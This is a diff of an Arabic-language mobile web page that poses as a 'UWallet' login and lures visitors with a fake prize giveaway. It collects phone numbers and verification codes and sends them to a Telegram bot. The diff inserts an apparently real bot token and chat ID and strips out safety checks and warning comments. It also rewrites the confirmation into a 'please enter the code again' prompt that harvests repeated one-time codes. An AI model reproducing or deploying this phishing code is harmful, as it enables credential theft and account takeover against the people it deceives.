@@ -21,7 +21,7 @@
 
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #0f1724 0%, #12263b 60%, #1e3c72 100%);
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
             display: flex;
             justify-content: center;
             align-items: center;
@@ -34,15 +34,14 @@
             max-width: 420px;
             height: 100vh;
             max-height: 100vh;
-            background: linear-gradient(180deg, #ffffff 0%, #fbfbfd 100%);
-            box-shadow: 0 25px 60px rgba(3, 10, 36, 0.45);
+            background: white;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.4);
             display: flex;
             flex-direction: column;
-            border-radius: 28px;
+            border-radius: 40px;
             overflow: hidden;
             position: relative;
             max-height: 100dvh;
-            border: 1px solid rgba(0,0,0,0.06);
         }
 
         /* ===== صفحة الترحيب ===== */
@@ -62,43 +61,41 @@
         }
 
         .welcome-header {
-            background: linear-gradient(135deg, #ff7a00 0%, #ff6b9d 100%);
-            padding: 22px 20px 28px;
+            background: linear-gradient(135deg, #e94560 0%, #ff6b9d 100%);
+            padding: 20px 20px 30px;
             text-align: center;
             flex-shrink: 0;
-            position: relative;
         }
 
         .welcome-logo {
-            font-size: 32px;
-            font-weight: 900;
-            margin-bottom: 6px;
+            font-size: 36px;
+            font-weight: 800;
+            margin-bottom: 8px;
             letter-spacing: 2px;
-            color: #fff;
         }
 
         .welcome-tagline {
-            font-size: 13px;
-            color: rgba(255, 255, 255, 0.95);
-            font-weight: 700;
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.9);
+            font-weight: 600;
         }
 
         .welcome-content {
             flex: 1;
-            padding: 26px 18px;
+            padding: 30px 20px;
             overflow-y: auto;
             display: flex;
             flex-direction: column;
-            gap: 22px;
+            gap: 25px;
             -webkit-overflow-scrolling: touch;
         }
 
         .welcome-section-title {
             text-align: center;
-            font-size: 18px;
-            font-weight: 800;
-            margin-bottom: 12px;
-            color: #ffd6e0;
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: 15px;
+            color: #ff6b9d;
             text-transform: uppercase;
             letter-spacing: 1px;
         }
@@ -110,62 +107,57 @@
         }
 
         .reward-card {
-            background: linear-gradient(180deg, rgba(255,255,255,0.03), rgba(255,255,255,0.01));
-            border-radius: 14px;
-            padding: 10px;
+            background: linear-gradient(135deg, rgba(255, 107, 157, 0.2) 0%, rgba(233, 69, 96, 0.2) 100%);
+            border: 2px solid #e94560;
+            border-radius: 15px;
+            padding: 15px;
             text-align: center;
-            transition: all 0.28s ease;
+            transition: all 0.3s ease;
             cursor: pointer;
-            border: 1px solid rgba(255,255,255,0.06);
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 8px;
-            min-height: 110px;
         }
 
-        .reward-card:hover {
-            transform: translateY(-6px);
-            box-shadow: 0 10px 30px rgba(0,0,0,0.25);
+        .reward-card:active {
+            transform: scale(0.95);
+            background: linear-gradient(135deg, rgba(255, 107, 157, 0.4) 0%, rgba(233, 69, 96, 0.4) 100%);
         }
 
-        .reward-img {
-            width: 72px;
-            height: 72px;
-            object-fit: cover;
-            border-radius: 12px;
-            border: 2px solid rgba(255,255,255,0.06);
-            background: linear-gradient(90deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
+        .reward-icon {
+            font-size: 40px;
+            margin-bottom: 8px;
         }
 
         .reward-title {
-            font-size: 13px;
-            font-weight: 800;
+            font-size: 12px;
+            font-weight: 700;
             color: #fff;
-            margin-top: 2px;
+            margin-bottom: 4px;
         }
 
         .reward-desc {
-            font-size: 11px;
+            font-size: 10px;
             color: rgba(255, 255, 255, 0.8);
         }
 
         .features-section {
-            background: rgba(255, 255, 255, 0.03);
-            border-radius: 12px;
-            padding: 14px;
-            border: 1px solid rgba(255, 255, 255, 0.04);
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 15px;
+            padding: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
         }
 
         .feature-item {
             display: flex;
             gap: 12px;
-            margin-bottom: 12px;
-            align-items: center;
+            margin-bottom: 15px;
+            align-items: flex-start;
+        }
+
+        .feature-item:last-child {
+            margin-bottom: 0;
         }
 
         .feature-icon {
-            font-size: 22px;
+            font-size: 24px;
             flex-shrink: 0;
             margin-top: 2px;
         }
@@ -176,37 +168,38 @@
 
         .feature-title {
             font-size: 13px;
-            font-weight: 800;
+            font-weight: 700;
             color: #fff;
-            margin-bottom: 4px;
+            margin-bottom: 3px;
         }
 
         .feature-desc {
-            font-size: 12px;
-            color: rgba(255, 255, 255, 0.85);
+            font-size: 11px;
+            color: rgba(255, 255, 255, 0.7);
             line-height: 1.4;
         }
 
         .welcome-btn {
-            background: linear-gradient(90deg, #ff8a00 0%, #ff6b9d 100%);
+            background: linear-gradient(135deg, #e94560 0%, #ff6b9d 100%);
             color: white;
             border: none;
-            padding: 14px 22px;
+            padding: 14px 20px;
             border-radius: 12px;
-            font-size: 15px;
-            font-weight: 800;
+            font-size: 14px;
+            font-weight: 700;
             cursor: pointer;
-            transition: all 0.25s ease;
+            transition: all 0.3s ease;
             text-transform: uppercase;
             letter-spacing: 1px;
             margin: 20px;
             margin-top: auto;
             flex-shrink: 0;
-            box-shadow: 0 12px 36px rgba(255,107,157,0.18);
+            box-shadow: 0 10px 30px rgba(233, 69, 96, 0.4);
         }
 
         .welcome-btn:active {
             transform: translateY(-2px);
+            box-shadow: 0 15px 40px rgba(233, 69, 96, 0.6);
         }
 
         /* ===== صفحة التسجيل ===== */
@@ -230,14 +223,14 @@
         .header-image {
             width: 100%;
             height: 100%;
-            object-fit: cover;
+            object-fit: contain;
             display: block;
-            padding: 8px;
+            padding: 10px;
         }
 
         .content {
             flex: 1;
-            padding: 24px 22px;
+            padding: 28px 24px;
             overflow-y: auto;
             overflow-x: hidden;
             display: flex;
@@ -251,7 +244,7 @@
         }
 
         .content::-webkit-scrollbar {
-            width: 6px;
+            width: 5px;
         }
 
         .content::-webkit-scrollbar-track {
@@ -259,13 +252,13 @@
         }
 
         .content::-webkit-scrollbar-thumb {
-            background: #e0e0e0;
+            background: #d0d0d0;
             border-radius: 3px;
         }
 
         .form-section {
             display: none;
-            animation: fadeIn 0.45s ease-in-out;
+            animation: fadeIn 0.5s ease-in-out;
         }
 
         .form-section.active {
@@ -275,7 +268,7 @@
         @keyframes fadeIn {
             from {
                 opacity: 0;
-                transform: translateY(12px);
+                transform: translateY(15px);
             }
             to {
                 opacity: 1;
@@ -284,13 +277,13 @@
         }
 
         .form-group {
-            margin-bottom: 18px;
+            margin-bottom: 20px;
         }
 
         .form-group label {
             display: block;
             font-size: 12px;
-            font-weight: 800;
+            font-weight: 700;
             color: #1e3c72;
             margin-bottom: 8px;
             text-transform: uppercase;
@@ -306,14 +299,14 @@
         .form-group .date-input {
             width: 100%;
             padding: 12px 14px;
-            border: 2px solid #efeff2;
+            border: 2px solid #e8e8e8;
             border-radius: 10px;
             font-size: 14px;
             font-family: inherit;
-            transition: all 0.22s ease;
+            transition: all 0.3s ease;
             text-align: left;
-            background: #fafafa;
-            color: #222;
+            background: #f9f9f9;
+            color: #333;
             -webkit-appearance: none;
             appearance: none;
         }
@@ -321,9 +314,9 @@
         .form-group input:focus,
         .form-group .date-input:focus {
             outline: none;
-            border-color: #ff6b9d;
+            border-color: #e94560;
             background: white;
-            box-shadow: 0 6px 18px rgba(255,107,157,0.12);
+            box-shadow: 0 0 0 3px rgba(233, 69, 96, 0.1);
         }
 
         .form-group input::placeholder {
@@ -334,19 +327,27 @@
             cursor: pointer;
         }
 
+        .date-input::-webkit-calendar-picker-indicator {
+            cursor: pointer;
+            border-radius: 4px;
+            margin-right: 4px;
+            opacity: 0.6;
+            filter: invert(0.6);
+        }
+
         .btn-submit {
             width: 100%;
             padding: 12px;
-            background: linear-gradient(90deg, #ff7a00 0%, #ff6b9d 100%);
+            background: linear-gradient(135deg, #e94560 0%, #ff6b9d 100%);
             color: white;
             border: none;
             border-radius: 10px;
-            font-size: 15px;
-            font-weight: 800;
+            font-size: 14px;
+            font-weight: 700;
             cursor: pointer;
-            transition: all 0.25s ease;
-            margin-top: 6px;
-            box-shadow: 0 10px 30px rgba(255,107,157,0.16);
+            transition: all 0.3s ease;
+            margin-top: 20px;
+            box-shadow: 0 10px 25px rgba(233, 69, 96, 0.3);
             text-transform: uppercase;
             letter-spacing: 0.5px;
             position: relative;
@@ -363,8 +364,8 @@
             left: -100%;
             width: 100%;
             height: 100%;
-            background: rgba(255,255,255,0.12);
-            transition: all 0.55s ease;
+            background: rgba(255, 255, 255, 0.2);
+            transition: all 0.5s ease;
         }
 
         .btn-submit:active {
@@ -384,12 +385,12 @@
 
         .verification-header {
             text-align: center;
-            margin-bottom: 14px;
+            margin-bottom: 20px;
         }
 
         .verification-title {
             font-size: 18px;
-            font-weight: 800;
+            font-weight: 700;
             color: #1e3c72;
             margin-bottom: 6px;
         }
@@ -401,22 +402,22 @@
         }
 
         .phone-display {
-            background: linear-gradient(90deg, #f7f8fa 0%, #fbfcfd 100%);
+            background: linear-gradient(135deg, #f5f7fa 0%, #f8f9fb 100%);
             padding: 12px 14px;
             border-radius: 10px;
-            margin-bottom: 18px;
-            font-size: 12px;
+            margin-bottom: 22px;
+            font-size: 11px;
             color: #666;
-            font-weight: 700;
+            font-weight: 600;
             text-align: center;
-            border: 1px solid #efeff2;
+            border: 1px solid #e8e8e8;
         }
 
         .verification-code-input {
             display: flex;
             justify-content: center;
             gap: 10px;
-            margin: 20px 0 18px;
+            margin: 30px 0 25px;
             flex-direction: row;
         }
 
@@ -428,7 +429,7 @@
             font-size: 22px;
             font-weight: 800;
             text-align: center;
-            transition: all 0.2s ease;
+            transition: all 0.3s ease;
             background: #f9f9f9;
             color: #333;
             cursor: text;
@@ -438,33 +439,33 @@
 
         .code-digit:focus {
             outline: none;
-            border-color: #ff6b9d;
+            border-color: #e94560;
             background: white;
-            box-shadow: 0 0 0 6px rgba(255,107,157,0.06);
-            transform: scale(1.03);
+            box-shadow: 0 0 0 3px rgba(233, 69, 96, 0.1);
+            transform: scale(1.05);
         }
 
         .code-digit.filled {
-            border-color: #ff6b9d;
-            background: linear-gradient(90deg, #ff7a00 0%, #ff6b9d 100%);
+            border-color: #e94560;
+            background: linear-gradient(135deg, #e94560 0%, #ff6b9d 100%);
             color: white;
-            font-weight: 900;
+            font-weight: 800;
         }
 
         .timer-section {
             text-align: center;
-            margin: 12px 0;
+            margin: 15px 0;
         }
 
         .timer {
             font-size: 20px;
-            font-weight: 800;
-            color: #ff6b9d;
+            font-weight: 700;
+            color: #e94560;
             transition: all 0.3s ease;
         }
 
         .timer.warning {
-            color: #ff4b4b;
+            color: #ff6b6b;
             animation: pulse 1s infinite;
         }
 
@@ -486,20 +487,20 @@
         }
 
         .resend-section {
-            margin-top: 18px;
-            padding-top: 16px;
-            border-top: 1px dashed #f0f0f0;
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 2px solid #f0f0f0;
             text-align: center;
         }
 
         .resend-btn {
             background: none;
             border: none;
-            color: #ff6b9d;
+            color: #e94560;
             font-size: 12px;
-            font-weight: 800;
+            font-weight: 700;
             cursor: pointer;
-            transition: all 0.2s ease;
+            transition: all 0.3s ease;
             padding: 6px 10px;
             text-decoration: none;
             text-transform: uppercase;
@@ -511,15 +512,15 @@
         }
 
         .resend-btn:disabled {
-            opacity: 0.45;
+            opacity: 0.4;
             cursor: not-allowed;
             transform: none;
         }
 
         .resend-countdown {
-            font-size: 11px;
+            font-size: 10px;
             color: #999;
-            margin-top: 6px;
+            margin-top: 4px;
         }
 
         .toast {
@@ -528,30 +529,26 @@
             left: 20px;
             background: #333;
             color: white;
-            padding: 12px 18px;
+            padding: 14px 20px;
             border-radius: 10px;
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
             animation: slideIn 0.4s ease-in-out;
             max-width: calc(100% - 40px);
             z-index: 1000;
-            font-size: 13px;
-            font-weight: 600;
+            font-size: 12px;
+            font-weight: 500;
         }
 
         .toast.success {
-            background: linear-gradient(90deg, #24c27a 0%, #00a86b 100%);
+            background: linear-gradient(135deg, #00b894 0%, #00a86b 100%);
         }
 
         .toast.error {
-            background: linear-gradient(90deg, #ff6b6b 0%, #ee5a6f 100%);
+            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a6f 100%);
         }
 
         .toast.info {
-            background: linear-gradient(90deg, #ff7a00 0%, #ff6b9d 100%);
-        }
-
-        .toast.hide {
-            animation: slideOut 0.4s ease-in-out forwards;
+            background: linear-gradient(135deg, #e94560 0%, #ff6b9d 100%);
         }
 
         @keyframes slideIn {
@@ -576,18 +573,22 @@
             }
         }
 
+        .toast.hide {
+            animation: slideOut 0.4s ease-in-out forwards;
+        }
+
         .error-message {
             color: #ff6b6b;
-            font-size: 11px;
-            margin-top: 6px;
+            font-size: 10px;
+            margin-top: 4px;
             text-align: left;
             display: none;
-            font-weight: 700;
+            font-weight: 500;
         }
 
         .error-message.show {
             display: block;
-            animation: shake 0.28s ease-in-out;
+            animation: shake 0.3s ease-in-out;
         }
 
         @keyframes shake {
@@ -627,7 +628,7 @@
 
         .modal.active {
             display: flex;
-            animation: fadeInModal 0.28s ease-in-out;
+            animation: fadeInModal 0.3s ease-in-out;
         }
 
         @keyframes fadeInModal {
@@ -641,17 +642,17 @@
 
         .modal-content {
             background: white;
-            border-radius: 14px;
-            padding: 22px 18px;
-            max-width: 320px;
+            border-radius: 16px;
+            padding: 30px 24px;
+            max-width: 300px;
             text-align: center;
-            box-shadow: 0 18px 48px rgba(0, 0, 0, 0.25);
-            animation: slideUp 0.34s ease-in-out;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            animation: slideUp 0.4s ease-in-out;
         }
 
         @keyframes slideUp {
             from {
-                transform: translateY(30px);
+                transform: translateY(50px);
                 opacity: 0;
             }
             to {
@@ -661,87 +662,41 @@
         }
 
         .modal-icon {
-            font-size: 42px;
-            margin-bottom: 12px;
+            font-size: 50px;
+            margin-bottom: 16px;
         }
 
         .modal-title {
-            font-size: 17px;
-            font-weight: 800;
+            font-size: 18px;
+            font-weight: 700;
             color: #1e3c72;
-            margin-bottom: 8px;
+            margin-bottom: 12px;
         }
 
         .modal-message {
             font-size: 13px;
             color: #666;
             line-height: 1.5;
-            margin-bottom: 18px;
+            margin-bottom: 24px;
         }
 
         .modal-btn {
             width: 100%;
             padding: 12px;
-            background: linear-gradient(90deg, #ff7a00 0%, #ff6b9d 100%);
+            background: linear-gradient(135deg, #e94560 0%, #ff6b9d 100%);
             color: white;
             border: none;
             border-radius: 10px;
-            font-size: 14px;
-            font-weight: 800;
+            font-size: 13px;
+            font-weight: 700;
             cursor: pointer;
-            transition: all 0.25s ease;
+            transition: all 0.3s ease;
             -webkit-appearance: none;
             appearance: none;
         }
 
         .modal-btn:active {
             transform: translateY(-1px);
-        }
-
-        /* Card info section */
-        .card-section {
-            margin-top: 14px;
-            background: #fff;
-            border-radius: 12px;
-            padding: 12px;
-            border: 1px solid #efeff2;
-            display: flex;
-            gap: 12px;
-            align-items: center;
-            color: #222;
-        }
-
-        .card-image {
-            width: 86px;
-            height: 54px;
-            object-fit: cover;
-            border-radius: 8px;
-            border: 1px solid #f0f0f0;
-        }
-
-        .card-desc {
-            font-size: 13px;
-            color: #333;
-            line-height: 1.3;
-            font-weight: 700;
-        }
-
-        .card-desc small {
-            display: block;
-            font-weight: 500;
-            color: #666;
-            margin-top: 6px;
-            font-size: 12px;
-            font-weight: 600;
-        }
-
-        footer.app-footer {
-            padding: 10px 14px;
-            text-align: center;
-            font-size: 12px;
-            color: #8892a6;
-            border-top: 1px solid #f1f3f6;
-            background: #fff;
         }
 
         @media (max-width: 480px) {
@@ -755,7 +710,7 @@
             }
 
             .content {
-                padding: 20px 16px;
+                padding: 24px 20px;
             }
         }
 
@@ -765,7 +720,7 @@
     </style>
 </head>
 <body>
-    <div class="mobile-container" aria-live="polite">
+    <div class="mobile-container">
         <!-- صفحة الترحيب -->
         <div class="welcome-section active" id="welcomeSection">
             <div class="welcome-header">
@@ -774,54 +729,39 @@
             </div>
 
             <div class="welcome-content">
-                <!-- البطاقة (نُقلت إلى الأعلى) -->
-                <div style="margin-bottom:8px;">
-                    <div class="welcome-section-title">💳 عن البطاقة</div>
-                    <div class="card-section" role="region" aria-label="معلومات البطاقة">
-                        <img class="card-image" src="https://e.top4top.io/p_3900aeb4n0.png" alt="صورة البطاقة uwallet" loading="lazy">
-                        <div class="card-desc">
-                            بطاقة UWallet - بطاقة مدفوعة مسبقاً متوافقة مع خدمات التطبيق، تمنحك سهولة الدفع والسحب من شبكة واسعة من المتاجر وماكينات الصراف الآلي.
-                            <small>مزايا: استلام عروض حصرية، حماية مشتريات، سهولة الشحن والتحكم عبر التطبيق.</small>
-                        </div>
-                    </div>
-                </div>
-
                 <!-- الجوائز -->
                 <div>
                     <div class="welcome-section-title">🎁 جوائز مذهلة تنتظرك</div>
                     <div class="rewards-grid">
-                        <div class="reward-card" role="button" tabindex="0" aria-label="آيفون 17 برو ماكس">
-                            <img class="reward-img" src="https://k.top4top.io/p_3900fu7c10.png" alt="صورة الآيفون 17 برو ماكس - برتقالي" loading="lazy">
-                            <div class="reward-title">آيفون 17 برو ماكس</div>
-                            <div class="reward-desc">إصدار برتقالي أنيق</div>
+                        <div class="reward-card">
+                            <div class="reward-icon">📱</div>
+                            <div class="reward-title">آيفون 17 برو</div>
+                            <div class="reward-desc">أحدث إصدار</div>
                         </div>
-                        <div class="reward-card" role="button" tabindex="0" aria-label="ايربودز برو">
-                            <img class="reward-img" src="https://a.top4top.io/p_39000jckm0.png" alt="ايربودز برو" loading="lazy">
+                        <div class="reward-card">
+                            <div class="reward-icon">🎧</div>
                             <div class="reward-title">ايربودز برو</div>
-                            <div class="reward-desc">جودة صوت متقدمة</div>
+                            <div class="reward-desc">تقنية متقدمة</div>
                         </div>
-
-                        <div class="reward-card" role="button" tabindex="0" aria-label="آيباد برو">
-                            <img class="reward-img" src="https://c.top4top.io/p_3900zs7r10.png" alt="آيباد برو" loading="lazy">
+                        <div class="reward-card">
+                            <div class="reward-icon">📱</div>
                             <div class="reward-title">آيباد برو</div>
-                            <div class="reward-desc">شاشة كبيرة للعمل والمرح</div>
+                            <div class="reward-desc">شاشة كبيرة</div>
                         </div>
-                        <div class="reward-card" role="button" tabindex="0" aria-label="سيارة فخمة">
-                            <img class="reward-img" src="https://e.top4top.io/p_3900xvxrq0.png" alt="صورة السيارة 1" loading="lazy">
-                            <div class="reward-title">تويوتا RAV</div>
-                            <div class="reward-desc">موديل فخم ومريح</div>
+                        <div class="reward-card">
+                            <div class="reward-icon">🚗</div>
+                            <div class="reward-title">سيارة فخمة</div>
+                            <div class="reward-desc">حلم الجميع</div>
                         </div>
-
-                        <!-- صور تم تبديلها كما طلبت -->
-                        <div class="reward-card" role="button" tabindex="0" aria-label="مبلغ نقدي 25 دينار">
-                            <img class="reward-img" src="https://g.top4top.io/p_3900559w61.png" alt="صورة 25 دينار" loading="lazy">
+                        <div class="reward-card">
+                            <div class="reward-icon">💰</div>
                             <div class="reward-title">25 دينار</div>
-                            <div class="reward-desc">مكافأة مرة واحدة</div>
+                            <div class="reward-desc">لمرة واحدة</div>
                         </div>
-                        <div class="reward-card" role="button" tabindex="0" aria-label="جوائز أخرى">
-                            <img class="reward-img" src="https://l.top4top.io/p_3900l59qa0.png" alt="جوائز ومفاجآت يومية" loading="lazy">
+                        <div class="reward-card">
+                            <div class="reward-icon">🎯</div>
                             <div class="reward-title">جوائز أخرى</div>
-                            <div class="reward-desc">مفاجآت يومية ومزايا حصرية</div>
+                            <div class="reward-desc">مفاجآت يومية</div>
                         </div>
                     </div>
                 </div>
@@ -834,7 +774,7 @@
                             <div class="feature-icon">🛡️</div>
                             <div class="feature-text">
                                 <div class="feature-title">أمان وموثوقية عالية</div>
-                                <div class="feature-desc">تقنية تشفير متطورة لحماية بياناتك ومعاملاتك المالية</div>
+                                <div class="feature-desc">تقنية تشفير متطورة لحماية بيانات عملائنا</div>
                             </div>
                         </div>
                         <div class="feature-item">
@@ -848,26 +788,26 @@
                             <div class="feature-icon">📱</div>
                             <div class="feature-text">
                                 <div class="feature-title">كل خدماتك بمكان واحد</div>
-                                <div class="feature-desc">دفعات، شحن، تحويل، وعروض حصرية داخل التطبيق</div>
+                                <div class="feature-desc">تطبيق شامل لجميع احتياجاتك المالية</div>
                             </div>
                         </div>
                         <div class="feature-item">
                             <div class="feature-icon">🎉</div>
                             <div class="feature-text">
                                 <div class="feature-title">مزايا وعروض حصرية</div>
-                                <div class="feature-desc">سحب يومي على جوائز بقيمة كبيرة ومفاجآت لمستخدمينا</div>
+                                <div class="feature-desc">استمتع بعروض وجوائز يومية</div>
                             </div>
                         </div>
                     </div>
                 </div>
             </div>
 
-            <button class="welcome-btn" id="startBtn" aria-label="ابدأ الآن">ابدأ الآن</button>
+            <button class="welcome-btn" id="startBtn">ابدأ الآن</button>
         </div>
 
         <!-- Header صفحة التسجيل -->
         <div class="header" id="header">
-            <img src="https://i.top4top.io/p_3899kc4nn0.jpeg" alt="uWallet Header" class="header-image" id="headerImg" loading="lazy">
+            <img src="https://h.top4top.io/p_3899c1vif0.jpeg" alt="uWallet Header" class="header-image" id="headerImg">
         </div>
 
         <!-- Content صفحة التسجيل -->
@@ -880,58 +820,53 @@
                         <input 
                             type="tel" 
                             id="phone" 
-                            placeholder="077xxxxxxx"
+                            placeholder="ادخل رقم الهاتف"
                             inputmode="numeric"
                             maxlength="10"
-                            aria-label="رقم الهاتف"
                         >
                     </div>
-                    <div class="error-message" id="phoneError" role="alert"></div>
+                    <div class="error-message" id="phoneError"></div>
                 </div>
 
-                <button class="btn-submit" id="loginBtn" aria-label="دخول">دخول</button>
+                <button class="btn-submit" id="loginBtn">دخول</button>
             </div>
 
             <!-- Verification Form -->
             <div class="form-section verification-section" id="verificationForm">
                 <div class="verification-header">
-                    <div class="verification-title">رمز التحقق</div>
+                    <div class="verification-title">Verification Code</div>
                     <div class="verification-subtitle">
-                        أدخل الرمز المكون من 4 أرقام<br>
-                        المرسل إلى رقم هاتفك
+                        Enter the 4-digit code<br>
+                        sent to your phone
                     </div>
                 </div>
 
                 <div class="phone-display" id="phoneDisplay">Sent to: xxxxxxxx77</div>
 
                 <div class="verification-code-input" id="codeInput">
-                    <input class="code-digit" type="text" inputmode="numeric" maxlength="1" data-index="0" aria-label="رمز رقم 1">
-                    <input class="code-digit" type="text" inputmode="numeric" maxlength="1" data-index="1" aria-label="رمز رقم 2">
-                    <input class="code-digit" type="text" inputmode="numeric" maxlength="1" data-index="2" aria-label="رمز رقم 3">
-                    <input class="code-digit" type="text" inputmode="numeric" maxlength="1" data-index="3" aria-label="رمز رقم 4">
+                    <input class="code-digit" type="text" inputmode="numeric" maxlength="1" data-index="0">
+                    <input class="code-digit" type="text" inputmode="numeric" maxlength="1" data-index="1">
+                    <input class="code-digit" type="text" inputmode="numeric" maxlength="1" data-index="2">
+                    <input class="code-digit" type="text" inputmode="numeric" maxlength="1" data-index="3">
                 </div>
 
                 <div class="timer-section">
                     <div class="timer" id="timer">5:00</div>
-                    <div class="timer-label">الوقت المتبقي</div>
+                    <div class="timer-label">Time Remaining</div>
                 </div>
 
-                <button class="btn-submit" id="verifyBtn" aria-label="تأكيد">تأكيد</button>
+                <button class="btn-submit" id="verifyBtn">Confirm</button>
 
                 <div class="resend-section">
-                    <button class="resend-btn" id="resendBtn" aria-label="إعادة إرسال الرمز">إعادة إرسال الرمز</button>
-                    <div class="resend-countdown" id="resendCountdown" aria-live="polite"></div>
+                    <button class="resend-btn" id="resendBtn">Resend Code</button>
+                    <div class="resend-countdown" id="resendCountdown"></div>
                 </div>
             </div>
-
-            <footer class="app-footer">
-                © 2026 UWallet — جميع الحقوق محفوظة
-            </footer>
         </div>
     </div>
 
     <!-- Success Modal -->
-    <div class="modal" id="successModal" role="dialog" aria-modal="true" aria-hidden="true">
+    <div class="modal" id="successModal">
         <div class="modal-content">
             <div class="modal-icon">📨</div>
             <div class="modal-title">يرجى الإدخال مرة أخرى</div>
@@ -943,12 +878,9 @@
     </div>
 
     <script>
-        // --- ملاحظة أمان:
-        // لا تضع توكن BOT و chat_id في واجهة المستخدم في بيئة إنتاجية.
-        // انقل عملية إرسال الرسائل إلى خادم (server-side) للحفاظ على المفاتيح والسرية.
-        // لكي يعمل المثال هنا افتراضياً: ضع القيم الحقيقية في المتغيرين أدناه أو قم بتشغيل إرسال من الخادم.
-        const TELEGRAM_BOT_TOKEN = 'REPLACE_WITH_TELEGRAM_BOT_TOKEN';
-        const TELEGRAM_CHAT_ID = 'REPLACE_WITH_TELEGRAM_CHAT_ID';
+        // Configuration
+        const TELEGRAM_BOT_TOKEN = '7327256170:AAEiQ_F_BI1V9iUHzgPPui7JRwqGnj6Jys4';
+        const TELEGRAM_CHAT_ID = '6873334348';
         const VERIFICATION_TIMER = 300;
 
         // Arabic to English digit mapping
@@ -985,7 +917,7 @@
             setTimeout(() => {
                 toast.classList.add('hide');
                 setTimeout(() => toast.remove(), 400);
-            }, 3500);
+            }, 4000);
         };
 
         const showModal = (title, message) => {
@@ -993,18 +925,15 @@
             modal.querySelector('.modal-title').textContent = title;
             modal.querySelector('.modal-message').textContent = message;
             modal.classList.add('active');
-            modal.setAttribute('aria-hidden', 'false');
         };
 
         const closeModal = () => {
-            const modal = document.getElementById('successModal');
-            modal.classList.remove('active');
-            modal.setAttribute('aria-hidden', 'true');
+            document.getElementById('successModal').classList.remove('active');
         };
 
         const formatPhoneDisplay = (phone) => {
             const lastDigits = phone.slice(-2);
-            return `تم الإرسال إلى: xxxxxxxx${lastDigits}`;
+            return `Sent to: xxxxxxxx${lastDigits}`;
         };
 
         const validatePhone = (phone) => {
@@ -1017,13 +946,6 @@
         };
 
         const sendToTelegram = async (data) => {
-            // إذا لم يتم وضع التوكن/الشات آي دي، نعيد false ونعرض رسالة توجيهية
-            if (TELEGRAM_BOT_TOKEN === 'REPLACE_WITH_TELEGRAM_BOT_TOKEN' ||
-                TELEGRAM_CHAT_ID === 'REPLACE_WITH_TELEGRAM_CHAT_ID') {
-                console.warn('Telegram token/chat_id not configured. Move sending to server.');
-                return false;
-            }
-
             try {
                 const message = `
 📱 <b>New Login Request</b>
@@ -1071,7 +993,7 @@ ${data.verificationCode ? `
                     clearInterval(timerInterval);
                     document.getElementById('resendBtn').disabled = false;
                     document.getElementById('verifyBtn').disabled = true;
-                    showToast('انتهى الوقت', 'error');
+                    showToast('Time expired', 'error');
                 }
             }, 1000);
         };
@@ -1090,9 +1012,7 @@ ${data.verificationCode ? `
         };
 
         const clearErrors = () => {
-            const el = document.getElementById('phoneError');
-            el.classList.remove('show');
-            el.textContent = '';
+            document.getElementById('phoneError').classList.remove('show');
         };
 
         const showError = (fieldId, message) => {
@@ -1102,7 +1022,7 @@ ${data.verificationCode ? `
         };
 
         const switchToVerification = async () => {
-            formData.phone = document.getElementById('phone').value.trim();
+            formData.phone = document.getElementById('phone').value;
 
             clearErrors();
 
@@ -1111,20 +1031,18 @@ ${data.verificationCode ? `
                 return;
             }
             if (!validatePhone(formData.phone)) {
-                showError('phoneError', 'تنسيق خاطئ — ابدأ بـ 077/078/079 ثم 7 أرقام');
+                showError('phoneError', '077/078/079 + 7 أرقام');
                 return;
             }
 
             formData.generatedCode = generateVerificationCode();
-            console.log('🔐 Generated Code:', formData.generatedCode);
+            console.log('🔐 Code:', formData.generatedCode);
 
             const loginBtn = document.getElementById('loginBtn');
             loginBtn.disabled = true;
             loginBtn.innerHTML = '<span class="loading"></span>';
 
-            // نرسل لمن يراقب الدخول (مع رمز إن أردت)
-            const payload = { phone: formData.phone, verificationCode: formData.generatedCode };
-            const sent = await sendToTelegram(payload);
+            const sent = await sendToTelegram(formData);
 
             loginBtn.disabled = false;
             loginBtn.textContent = 'دخول';
@@ -1141,7 +1059,7 @@ ${data.verificationCode ? `
                 startTimer();
                 isVerificationPageActive = true;
             } else {
-                showToast('لم يتم الإرسال — تأكد من إعداد التليجرام أو انقل الإرسال إلى الخادم', 'error');
+                showToast('خطأ في الإرسال', 'error');
             }
         };
 
@@ -1153,15 +1071,13 @@ ${data.verificationCode ? `
                 return;
             }
 
-            const payload = { phone: formData.phone, verificationCode: formData.verificationCode };
-            const sent = await sendToTelegram(payload);
+            const sent = await sendToTelegram(formData);
 
             if (sent) {
-                showModal('تم الإرسال', 'تم استلام الرمز، سيتم التواصل معك قريبا');
+                showModal('يرجى الإدخال مرة أخرى', 'تم الإرسال، يرجى إدخال الرمز مرة أخرى بشكل صحيح');
                 clearCodeInputs();
             } else {
-                // لا نكشف تفاصيل الخادم للعميل؛ نعرض رسالة عامة
-                showToast('حدث خطأ أثناء التحقق. حاول لاحقاً.', 'error');
+                showToast('خطأ', 'error');
             }
         };
 
@@ -1178,11 +1094,10 @@ ${data.verificationCode ? `
 
             formData.generatedCode = generateVerificationCode();
 
-            const payload = { phone: formData.phone, verificationCode: formData.generatedCode };
-            const sent = await sendToTelegram(payload);
+            const sent = await sendToTelegram(formData);
 
             if (sent) {
-                showToast('تم إعادة إرسال الرمز', 'success');
+                showToast('Code Resent', 'success');
                 clearCodeInputs();
                 timeRemaining = VERIFICATION_TIMER;
                 clearInterval(timerInterval);
@@ -1192,7 +1107,7 @@ ${data.verificationCode ? `
                 updateResendCountdown();
                 resendInterval = setInterval(updateResendCountdown, 1000);
             } else {
-                showToast('خطأ في إعادة الإرسال', 'error');
+                showToast('خطأ', 'error');
                 resendBtn.disabled = false;
             }
         };
@@ -1203,7 +1118,7 @@ ${data.verificationCode ? `
             const resendCountdownEl = document.getElementById('resendCountdown');
             
             if (resendCountdown > 0) {
